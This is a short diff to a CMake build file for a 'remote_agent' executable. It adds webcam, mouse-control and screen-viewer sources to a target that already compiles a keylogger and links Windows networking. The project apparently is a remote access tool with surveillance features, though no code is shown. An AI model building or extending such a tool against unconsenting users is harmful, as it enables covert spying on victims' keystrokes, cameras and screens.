@@ -15,7 +15,10 @@ add_executable(remote_agent
     src/system_power.cpp
     src/file_ops.cpp
     src/keylogger.cpp
- )
+    src/webcam.cpp
+    src/mouse_control.cpp
+    src/screen_viewer.cpp
+)
 
 if(WIN32)
   target_link_libraries(remote_agent ws2_32)
